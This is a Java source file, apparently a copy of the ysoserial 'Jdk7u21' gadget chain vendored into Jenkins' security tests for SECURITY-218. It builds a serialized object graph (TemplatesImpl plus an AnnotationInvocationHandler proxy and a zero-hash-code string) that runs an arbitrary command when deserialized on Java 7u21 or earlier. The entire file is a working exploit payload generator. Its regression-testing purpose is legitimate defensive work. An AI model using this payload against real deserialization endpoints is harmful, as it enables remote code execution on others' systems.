
package jenkins.security.security218.ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

import javax.xml.transform.Templates;

import jenkins.security.security218.ysoserial.payloads.annotation.Dependencies;
import jenkins.security.security218.ysoserial.payloads.annotation.PayloadTest;
import jenkins.security.security218.ysoserial.payloads.util.Gadgets;
import jenkins.security.security218.ysoserial.payloads.util.JavaVersion;
import jenkins.security.security218.ysoserial.payloads.util.PayloadRunner;
import jenkins.security.security218.ysoserial.payloads.util.Reflections;




@SuppressWarnings({ "rawtypes", "unchecked" })
@Dependencies()
@PayloadTest ( precondition = "isApplicableJavaVersion")
public class Jdk7u21 implements ObjectPayload<Object> {

	public Object getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);

		String zeroHashCodeStr = "f5a5a608";

		HashMap map = new HashMap();
		map.put(zeroHashCodeStr, "foo");

		InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
		Reflections.setFieldValue(tempHandler, "type", Templates.class);
		Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

		LinkedHashSet set = new LinkedHashSet(); 		set.add(templates);
		set.add(proxy);

		Reflections.setFieldValue(templates, "_auxClasses", null);
		Reflections.setFieldValue(templates, "_class", null);

		map.put(zeroHashCodeStr, templates); 
		return set;
	}
	
	public static boolean isApplicableJavaVersion() {
	    JavaVersion v = JavaVersion.getLocalVersion();
	    return v != null && (v.major < 7 || (v.major == 7 && v.update <= 21));
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(Jdk7u21.class, args);
	}

}
